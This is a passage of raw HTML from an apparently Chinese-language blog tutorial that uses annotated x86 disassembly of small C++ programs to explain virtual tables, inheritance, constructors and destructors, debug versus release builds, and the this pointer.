class=\"line\">000A1529    53              push    ebx</span><br><span class=\"line\">000A152A    56              push    esi</span><br><span class=\"line\">000A152B    57              push    edi</span><br><span class=\"line\">000A152C    8DBD 30FFFFFF   lea     edi,dword ptr ss:[ebp-0xD0]</span><br><span class=\"line\">000A1532    B9 34000000     mov     ecx,0x34</span><br><span class=\"line\">000A1537    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">000A153C    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">000A153E    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1541    E8 A4FCFFFF     call    000A11EA</span><br><span class=\"line\"></span><br><span class=\"line\">000A1546    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1549    E8 D0FAFFFF     call    000A101E</span><br><span class=\"line\"></span><br><span class=\"line\">000A154E    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1551    E8 62FCFFFF     call    000A11B8</span><br><span class=\"line\"></span><br><span class=\"line\">000A1556    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1559    E8 3CFCFFFF     call    000A119A</span><br><span class=\"line\"></span><br><span class=\"line\">000A155E    33C0            xor     eax,eax</span><br><span class=\"line\">000A1560    52              push    edx</span><br><span class=\"line\">000A1561    8BCD            mov     ecx,ebp</span><br><span class=\"line\">000A1563    50              push    eax</span><br><span class=\"line\">000A1564    8D15 88150A00   lea     edx,dword ptr ds:[0xA1588]</span><br><span class=\"line\">000A156A    E8 4FFBFFFF     call    000A10BE</span><br><span class=\"line\">000A156F    58              pop     eax</span><br><span class=\"line\">000A1570    5A              pop     edx</span><br><span class=\"line\">000A1571    5F              pop     edi</span><br><span class=\"line\">000A1572    5E              pop     esi</span><br><span class=\"line\">000A1573    5B              pop     ebx</span><br><span class=\"line\">000A1574    81C4 D0000000   add     esp,0xD0</span><br><span class=\"line\">000A157A    3BEC            cmp     ebp,esp</span><br><span class=\"line\">000A157C    E8 50FCFFFF     call    000A11D1</span><br><span class=\"line\">000A1581    8BE5            mov     esp,ebp</span><br><span class=\"line\">000A1583    5D              pop     ebp</span><br><span class=\"line\">000A1584    C3              retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//000A11EA处的代码为</span><br><span class=\"line\">013E11EA   /E9 61050000     jmp     base_class::base_class</span><br><span class=\"line\"></span><br><span class=\"line\">013E1750 &gt;  55              push    ebp</span><br><span class=\"line\">013E1751    8BEC            mov     ebp,esp</span><br><span class=\"line\">013E1753    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">013E1759    53              push    ebx</span><br><span class=\"line\">013E175A    56              push    esi</span><br><span class=\"line\">013E175B    57              push    edi</span><br><span class=\"line\">013E175C    51              push    ecx</span><br><span class=\"line\">013E175D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">013E1763    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">013E1768    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">013E176D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">013E176F    59              pop     ecx</span><br><span class=\"line\">013E1770    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">013E1773    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">013E1776    C700 7C783E01   mov     dword ptr ds:[eax],offset base_class::`vftable&#x27;</span><br><span class=\"line\">//此处为虚表的虚表指针eax中的值就是vftable的指针</span><br><span class=\"line\">013E177C    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">013E177F    5F              pop     edi</span><br><span class=\"line\">013E1780    5E              pop     esi</span><br><span class=\"line\">013E1781    5B              pop     ebx</span><br><span class=\"line\">013E1782    8BE5            mov     esp,ebp</span><br><span class=\"line\">013E1784    5D              pop     ebp</span><br><span class=\"line\">013E1785    C3              retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//000A101E处的代码为</span><br><span class=\"line\">013E101E   /E9 AD050000     jmp     base_class::v_func1</span><br><span class=\"line\"></span><br><span class=\"line\">013E15D0 &gt;  55              push    ebp</span><br><span class=\"line\">013E15D1    8BEC            mov     ebp,esp</span><br><span class=\"line\">013E15D3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">013E15D9    53              push    ebx</span><br><span class=\"line\">013E15DA    56              push    esi</span><br><span class=\"line\">013E15DB    57              push    edi</span><br><span class=\"line\">013E15DC    51              push    ecx</span><br><span class=\"line\">013E15DD    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">013E15E3    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">013E15E8    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">013E15ED    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">013E15EF    59              pop     ecx</span><br><span class=\"line\">013E15F0    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">013E15F3    8BF4            mov     esi,esp</span><br><span class=\"line\">013E15F5    A1 10B33E01     mov     eax,dword ptr ds:[&lt;&amp;MSVCP90D.std::endl&gt;]</span><br><span class=\"line\">013E15FA    50              push    eax</span><br><span class=\"line\">013E15FB    68 00783E01     push    013E7800                                                                                     ; ASCII 54,&quot;his is base_class&#x27;s v_func1()&quot;</span><br><span class=\"line\">013E1600    8B0D 0CB33E01   mov     ecx,dword ptr ds:[&lt;&amp;MSVCP90D.std::cout&gt;]                                                     ; msvcp90d.std::cout</span><br><span class=\"line\">013E1606    51              push    ecx</span><br><span class=\"line\">013E1607    E8 6BFBFFFF     call    013E1177</span><br><span class=\"line\">013E160C    83C4 08         add     esp,0x8</span><br><span class=\"line\">013E160F    8BC8            mov     ecx,eax</span><br><span class=\"line\">013E1611    FF15 08B33E01   call    dword ptr ds:[&lt;&amp;MSVCP90D.std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt;&gt;]      ; msvcp90d.std::basic_ostream&lt;wchar_t,std::char_traits&lt;wchar_t&gt; &gt;::operator&lt;&lt;</span><br><span class=\"line\">013E1617    3BF4            cmp     esi,esp</span><br><span class=\"line\">013E1619    E8 B3FBFFFF     call    013E11D1</span><br><span class=\"line\">013E161E    5F              pop     edi</span><br><span class=\"line\">013E161F    5E              pop     esi</span><br><span class=\"line\">013E1620    5B              pop     ebx</span><br><span class=\"line\">013E1621    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">013E1627    3BEC            cmp     ebp,esp</span><br><span class=\"line\">013E1629    E8 A3FBFFFF     call    013E11D1</span><br><span class=\"line\">013E162E    8BE5            mov     esp,ebp</span><br><span class=\"line\">013E1630    5D              pop     ebp</span><br><span class=\"line\">013E1631    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\">000A11B8</span><br><span class=\"line\">000A119A</span><br><span class=\"line\">分别是func2和func3的代码</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109211943483.png\" alt=\"image-20221109211943483\"></p>\n<h3 id=\"debug版本和release版本\"><a class=\"markdownIt-Anchor\" href=\"#debug版本和release版本\">#</a> debug 版本和 release 版本</h3>\n<p>debug 版本：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109212625495.png\" alt=\"image-20221109212625495\"></p>\n<p>release 版本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109212653171.png\" alt=\"image-20221109212653171\"></p>\n<p>debug main</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654330003859-a991baf8-cefe-46fb-83c2-602148a95ba5.png\" alt=\"img\"></p>\n<p>release main</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109213010383.png\" alt=\"image-20221109213010383\"></p>\n<p>对于刚刚的虚函数</p>\n<p>debug</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109213138880.png\" alt=\"image-20221109213138880\"></p>\n<p>release</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109213209477.png\" alt=\"image-20221109213209477\"></p>\n<h3 id=\"c中类与继承在汇编中的关系\"><a class=\"markdownIt-Anchor\" href=\"#c中类与继承在汇编中的关系\">#</a> C++ 中类与继承在汇编中的关系</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">class employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\temployee() &#123; printf(&quot;employee()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~employee() &#123; printf(&quot;~employee()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">class manager : public employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tmanager() &#123; printf(&quot;manager()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~manager() &#123;  printf(&quot;~maneger()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tmanager my;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010D13D0 &gt;  55              push    ebp</span><br><span class=\"line\">010D13D1    8BEC            mov     ebp,esp</span><br><span class=\"line\">010D13D3    81EC D8000000   sub     esp,0xD8</span><br><span class=\"line\">010D13D9    53              push    ebx</span><br><span class=\"line\">010D13DA    56              push    esi</span><br><span class=\"line\">010D13DB    57              push    edi</span><br><span class=\"line\">010D13DC    8DBD 28FFFFFF   lea     edi,dword ptr ss:[ebp-0xD8]</span><br><span class=\"line\">010D13E2    B9 36000000     mov     ecx,0x36</span><br><span class=\"line\">010D13E7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">010D13EC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">//堆栈操作</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D13EE    8D4D FB         lea     ecx,dword ptr ss:[ebp-0x5]</span><br><span class=\"line\">010D13F1    E8 22FDFFFF     call    010D1118</span><br><span class=\"line\">//010D1118   /E9 63030000     jmp     manager::manager</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D13F6    8BF4            mov     esi,esp</span><br><span class=\"line\">010D13F8    FF15 C4820D01   call    dword ptr ds:[&lt;&amp;MSVCR90D.getchar&gt;]        ; msvcr90d.getchar</span><br><span class=\"line\">010D13FE    3BF4            cmp     esi,esp</span><br><span class=\"line\">010D1400    E8 54FDFFFF     call    010D1159</span><br><span class=\"line\">010D1405    C785 2CFFFFFF 0&gt;mov     dword ptr ss:[ebp-0xD4],0x0</span><br><span class=\"line\">010D140F    8D4D FB         lea     ecx,dword ptr ss:[ebp-0x5]</span><br><span class=\"line\">010D1412    E8 11FCFFFF     call    010D1028</span><br><span class=\"line\">//010D1028   /E9 33050000     jmp     manager::~manager</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D1417    8B85 2CFFFFFF   mov     eax,dword ptr ss:[ebp-0xD4]</span><br><span class=\"line\">010D141D    52              push    edx</span><br><span class=\"line\">010D141E    8BCD            mov     ecx,ebp</span><br><span class=\"line\">010D1420    50              push    eax</span><br><span class=\"line\">010D1421    8D15 44140D01   lea     edx,dword ptr ds:[0x10D1444]</span><br><span class=\"line\">010D1427    E8 6AFCFFFF     call    010D1096</span><br><span class=\"line\">010D142C    58              pop     eax</span><br><span class=\"line\">010D142D    5A              pop     edx</span><br><span class=\"line\">010D142E    5F              pop     edi</span><br><span class=\"line\">010D142F    5E              pop     esi</span><br><span class=\"line\">010D1430    5B              pop     ebx</span><br><span class=\"line\">010D1431    81C4 D8000000   add     esp,0xD8</span><br><span class=\"line\">010D1437    3BEC            cmp     ebp,esp</span><br><span class=\"line\">010D1439    E8 1BFDFFFF     call    010D1159</span><br><span class=\"line\">010D143E    8BE5            mov     esp,ebp</span><br><span class=\"line\">010D1440    5D              pop     ebp</span><br><span class=\"line\">010D1441    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010D1118</span><br><span class=\"line\">010D1118   /E9 63030000     jmp     manager::manager</span><br><span class=\"line\"></span><br><span class=\"line\">010D1480 &gt;  55              push    ebp</span><br><span class=\"line\">010D1481    8BEC            mov     ebp,esp</span><br><span class=\"line\">010D1483    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">010D1489    53              push    ebx</span><br><span class=\"line\">010D148A    56              push    esi</span><br><span class=\"line\">010D148B    57              push    edi</span><br><span class=\"line\">010D148C    51              push    ecx</span><br><span class=\"line\">010D148D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">010D1493    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">010D1498    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">010D149D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">010D149F    59              pop     ecx</span><br><span class=\"line\">010D14A0    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">010D14A3    8B4D F8         mov     ecx,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">010D14A6    E8 FAFBFFFF     call    010D10A5</span><br><span class=\"line\">//010D10A5   /E9 46040000     jmp     employee::employee</span><br><span class=\"line\"></span><br><span class=\"line\">-</span><br><span class=\"line\">010D14AB    8BF4            mov     esi,esp</span><br><span class=\"line\">010D14AD    68 3C570D01     push    010D573C                              ; ASCII &quot;manager()!\\n&quot;</span><br><span class=\"line\">010D14B2    FF15 BC820D01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">010D14B8    83C4 04         add     esp,0x4</span><br><span class=\"line\">010D14BB    3BF4            cmp     esi,esp</span><br><span class=\"line\">010D14BD    E8 97FCFFFF     call    010D1159</span><br><span class=\"line\">010D14C2    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">010D14C5    5F              pop     edi</span><br><span class=\"line\">010D14C6    5E              pop     esi</span><br><span class=\"line\">010D14C7    5B              pop     ebx</span><br><span class=\"line\">010D14C8    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">010D14CE    3BEC            cmp     ebp,esp</span><br><span class=\"line\">010D14D0    E8 84FCFFFF     call    010D1159</span><br><span class=\"line\">010D14D5    8BE5            mov     esp,ebp</span><br><span class=\"line\">010D14D7    5D              pop     ebp</span><br><span class=\"line\">010D14D8    C3              retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010D1412    E8 11FCFFFF     call    010D1028</span><br><span class=\"line\">010D1028   /E9 33050000     jmp     manager::~manager</span><br><span class=\"line\"></span><br><span class=\"line\">010D1560 &gt;  55              push    ebp</span><br><span class=\"line\">010D1561    8BEC            mov     ebp,esp</span><br><span class=\"line\">010D1563    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">010D1569    53              push    ebx</span><br><span class=\"line\">010D156A    56              push    esi</span><br><span class=\"line\">010D156B    57              push    edi</span><br><span class=\"line\">010D156C    51              push    ecx</span><br><span class=\"line\">010D156D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">010D1573    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">010D1578    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">010D157D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">010D157F    59              pop     ecx</span><br><span class=\"line\">010D1580    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">010D1583    8BF4            mov     esi,esp</span><br><span class=\"line\">010D1585    68 5C570D01     push    010D575C                                  ; ASCII &quot;~maneger()!\\n&quot;</span><br><span class=\"line\">010D158A    FF15 BC820D01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]         ; msvcr90d.printf</span><br><span class=\"line\">010D1590    83C4 04         add     esp,0x4</span><br><span class=\"line\">010D1593    3BF4            cmp     esi,esp</span><br><span class=\"line\">010D1595    E8 BFFBFFFF     call    010D1159</span><br><span class=\"line\">010D159A    8B4D F8         mov     ecx,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">010D159D    E8 8BFAFFFF     call    010D102D</span><br><span class=\"line\">//010D102D   /E9 9E050000     jmp     employee::~employee</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D15A2    5F              pop     edi</span><br><span class=\"line\">010D15A3    5E              pop     esi</span><br><span class=\"line\">010D15A4    5B              pop     ebx</span><br><span class=\"line\">010D15A5    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">010D15AB    3BEC            cmp     ebp,esp</span><br><span class=\"line\">010D15AD    E8 A7FBFFFF     call    010D1159</span><br><span class=\"line\">010D15B2    8BE5            mov     esp,ebp</span><br><span class=\"line\">010D15B4    5D              pop     ebp</span><br><span class=\"line\">010D15B5    C3              retn</span><br></pre></td></tr></table></figure>\n<p>private</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">class employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\temployee() &#123; printf(&quot;employee()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~employee() &#123; printf(&quot;~employee()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">class manager : public employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\tmanager() &#123; printf(&quot;manager()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~manager() &#123;  printf(&quot;~maneger()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tmanager my;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"从反汇编角度看this指针\"><a class=\"markdownIt-Anchor\" href=\"#从反汇编角度看this指针\">#</a> 从反汇编角度看 this 指针</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"> </span><br><span class=\"line\">struct MyStruct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int x ;</span><br><span class=\"line\">    int y ;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">//函数在结构体外部</span><br><span class=\"line\">void Max(MyStruct* str)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (str-&gt;x &gt; str-&gt;y)</span><br><span class=\"line\">        printf(&quot;%d&quot;,str-&gt;x);</span><br><span class=\"line\">    else</span><br><span class=\"line\">        printf(&quot;%d&quot;,str-&gt;y);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MyStruct haha ;</span><br><span class=\"line\">    haha.x = 1 ;</span><br><span class=\"line\">    haha.y = 2 ;</span><br><span class=\"line\">    Max(&amp;haha);</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,sizeof(haha));</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span 